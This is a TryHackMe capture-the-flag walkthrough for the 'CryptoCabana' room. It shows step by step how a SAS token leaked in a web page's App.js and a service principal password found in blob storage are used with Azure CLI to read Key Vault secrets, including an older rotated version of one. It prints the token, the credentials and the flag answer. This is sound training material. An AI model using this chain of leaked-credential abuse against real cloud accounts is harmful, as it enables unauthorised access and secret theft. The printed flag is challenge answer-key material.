![CryptoCabana Banner](https://cdn-images.tryhackme.com/room-icons/5dbea226085ab6182a2ee0f7-1785218015110)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-cryptocabana-f81cac95/CryptoCabana_Cover.png" alt="CryptoCabana Logo">
</p>

# <img src="https://cdn-images.tryhackme.com/room-icons/5dbea226085ab6182a2ee0f7-1785218019756" alt="image" style="vertical-align: middle;height: 50px;" /> CryptoCabana

This guide contains the answer and steps necessary to get to them for the [CryptoCabana](https://tryhackme.com/room/hh-cryptocabana-f81cac95) room.

<h2>Table of contents</h2>

- [Task 2 - Hacker Holidays: Day 9](#task-2---hacker-holidays-day-9)

### Task 2 - Hacker Holidays: Day 9

1.  What is the flag?

    If we go to the target page listed, we see we can back up our seed phrase to our vault. As expected, our random seedphrase doesn't work.
    
    ![Phrase](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-cryptocabana-f81cac95/CryptoCabana_Phrase.png)

    However, the page also reveals some crucial information. Looking at the debugging tab in the developer tools, we can see a script called 'App.js'.
    
    ![Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-cryptocabana-f81cac95/CryptoCabana_Script.png)

    As we can see, this is related to connecting and storing data in the azure instance. But it is revealing a token that we can use to investigate this storage unit.

    Lets add the account name and token to our shell session in Azure CLI.

    ```console
    ACC="cryptocabanaf5scjagc"
    SAS="sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D"
    ```

    We can then list the available containers and their underlying blobs.

    ```console
    az storage container list --account-name "$ACC" --sas-token "$SAS" -o table
    az storage blob list --account-name "$ACC" --sas-token "$SAS" --container-name backups -o table
    az storage blob list --account-name "$ACC" --sas-token "$SAS" --container-name vault -o table
    ```

    ![Blobs](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-cryptocabana-f81cac95/CryptoCabana_Blobs.png)

    We can see that the vault container has some interesting files. Lets download them and see what it says.

    ```console
    az storage blob download --account-name "$ACC" --sas-token "$SAS" --container-name vault --name "backup-service-account.json" --file ./backup-service-account.json
    az storage blob download --account-name "$ACC" --sas-token "$SAS" --container-name vault --name "seed_phrase.txt" --file ./seed_phrase.txt

    cat backup-service-account.json
    cat seed_phrase.txt
    ```

    ![Files](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-cryptocabana-f81cac95/CryptoCabana_Files.png)

    Apparently someone stored a service account credential file in here together with a recovery phrase. We can try to login to this account and check if we can read the contents.

    ```console
    az login --service-principal --username "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5" --password "UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg" --tenant "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c"
    ```

    ![Switch](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-cryptocabana-f81cac95/CryptoCabana_Switch.png)

    Now we can try to list the keys and read their contents.

    ```console
    az keyvault secret list --vault-name "ccabana-kv-f5scjagc" -o table

    az keyvault secret show --vault-name "ccabana-kv-f5scjagc" --name "key-shard-1" --query value -o tsv
    az keyvault secret show --vault-name "ccabana-kv-f5scjagc" --name "key-shard-2" --query value -o tsv
    az keyvault secret show --vault-name "ccabana-kv-f5scjagc" --name "key-shard-3" --query value -o tsv
    ```

    ![Keys](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-cryptocabana-f81cac95/CryptoCabana_Keys.png)

    Looks like we almost got our flag. One of the keys has been rotated. This, luckily, doesn't mean the old version is deleted. Lets check if we can see any older versions of said key.

    ```console
    az keyvault secret list-versions --vault-name "ccabana-kv-f5scjagc" --name "key-shard-2" -o table
    az keyvault secret list-versions --vault-name "ccabana-kv-f5scjagc" --name "key-shard-2"
    ```
    
    ![Version](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-cryptocabana-f81cac95/CryptoCabana_Version.png)

    I listed the entire table, because I need the id to properly view the older version. It looks like the first entry was created before the second ony. Note the id (only the last past) and modify our previous command to show a specific version of that key.

    ```console
    az keyvault secret show --vault-name "ccabana-kv-f5scjagc" --name "key-shard-2" --version "3d6492d2c6f74123bc754a9ded22b2a0" --query value -o tsv
    ```

    ![New_Key](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-cryptocabana-f81cac95/CryptoCabana_New_Key.png)

    Now we have all pieace of the flag!

    ><details><summary>Click for answer</summary>THM{n0t_ur_k3ys_n0t_ur_c01ns!}</details>
